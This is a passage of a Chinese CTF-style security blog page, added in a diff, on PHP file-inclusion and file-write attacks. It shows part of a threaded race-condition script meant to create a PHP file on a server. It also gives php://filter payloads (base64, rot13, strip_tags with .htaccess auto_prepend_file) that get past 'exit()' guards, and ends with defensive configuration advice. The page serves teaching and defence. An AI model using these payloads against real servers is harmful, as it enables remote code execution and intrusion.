+        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>     <span class="token comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'++++++++ Done! +++++++++'</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>       
+    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>     <span class="token comment"># 为每个函数设置5个线程并发执行</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment">#print('*'*50)</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment">#print('='*50)</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h2 id="绕过死亡代码"><a href="#绕过死亡代码" class="headerlink" title="绕过死亡代码"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">绕过死亡代码</a></h2><blockquote>
+<p>原型</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1. file_put_contents($filename,"&lt;?php exit();".$content);
+
+2. file_put_contents($content,"&lt;?php exit();".$content);
+
+3. file_put_contents($filename,$content . "\nxxxxxx");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li><ul>
+<li><p><strong>base64编码绕过</strong></p>
+<p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p>
+</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource=1.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aPD9waHAgcGhwaW5mbygpOz8+'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$content</span>加了一个a，是因为base64在解码的时候是将<span class="token number">4</span>个字节转化为<span class="token number">3</span>个字节，又因为死亡代码只有phpexit<span class="token operator">/</span>phpdie参与了解码，所以补上一位就可以完全转化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><strong>rot13编码绕过</strong></p>
+<p>原理和base64一样，可以直接转码分解死亡代码</p>
+</li>
+</ul>
+<blockquote>
+<p>注：因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用</p>
+</blockquote>
+<ul>
+<li><p><strong>.htaccess的预包含利用</strong></p>
+<p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件</p>
+</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=string.strip_tags/resource=.htaccess</span>
+
+<span class="token variable">$content</span><span class="token operator">=</span><span class="token operator">?</span><span class="token operator">></span>php_value<span class="token operator">%</span><span class="token number">20</span>auto_prepend_file<span class="token operator">%</span><span class="token number">20</span>G<span class="token punctuation">:</span>\s1mple<span class="token operator">.</span>php
+    
+首先来解释<span class="token variable">$filename</span>的代码，这里引用了<span class="token keyword type-declaration">string</span><span class="token operator">.</span>strip_tags过滤器，可以过滤<span class="token operator">.</span>htaccess内容的html标签，自然也就消除了死亡代码；<span class="token variable">$content</span>即闭合死亡代码使其完全消除，并且写入自定义包含文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag   &#x2F;flag  &#x2F;flag.php  等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a><a id=8>防御</a></h2><ul>
+<li><p><strong>调整php.ini中的不合理配置</strong></p>
+<ul>
+<li><strong>magic_quotes_gpc&#x3D;On</strong>，将参数中的异常字符进行转义。</li>
+<li><strong>allow_url_include&#x3D;Off</strong>，禁止将URL作为文件打开处理。</li>
+<li><strong>allow_url_fopen&#x3D;Off</strong>，禁止<code>include()</code>和<code>require()</code>打开URL作为文件处理</li>
+</ul>
+</li>
+<li><p><strong>过滤异常字符</strong></p>
+<p>检查参数，如果参数中含有<code>%</code>，<code>#</code>，<code>;</code>等不需要的字符，将其去掉或者拒绝请求</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310"><strong>更改Apache日志路径</strong></a></p>
+</li>
+<li><p><strong>写死包含的路径或文件名</strong></p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+    header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);
+    error_reporting(E_ERROR); 
+    ini_set(&quot;display_errors&quot;,&quot;Off&quot;);
+    $link&#x3D;$_GET[&#39;jumpTo&#39;];
+    if (isset($link)) &#123;
+        switch ($link) &#123;
+            case &#39;job&#39;:
+                include(&#39;.&#x2F;jobs.php&#39;);
+                break;
+            case &#39;hobby&#39;:
+                include(&#39;.&#x2F;hobby.php&#39;);
+                break;
+            default:
+                die(&quot;风雪的缩影，如琉璃般飘落......&quot;);
+                break;
+        &#125;
+    &#125; else &#123;
+    	&#x2F;&#x2F; Do nothing.    
+    &#125;
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang&#x3D;&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;
+    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
+    &lt;title&gt;王小美の主页&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+    &lt;h1 style&#x3D;&quot;text-align: center;&quot;&gt;个人主页&lt;&#x2F;h1&gt;
+    &lt;br&gt;
+    &lt;img src&#x3D;&quot;.&#x2F;img&#x2F;ganyu.png&quot;&gt;
+    &lt;br&gt;
+    &lt;p&gt;Name: 甘雨&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;p&gt;Age: 3000+&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;p&gt;我是女生&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;a href&#x3D;&quot;.&#x2F;index.php?jumpTo&#x3D;job&quot;&gt;我的工作&lt;&#x2F;a&gt;&amp;nbsp;&amp;nbsp;&lt;a href&#x3D;&quot;.&#x2F;index.php?jumpTo&#x3D;hobby&quot;&gt;我的兴趣爱好&lt;&#x2F;a&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
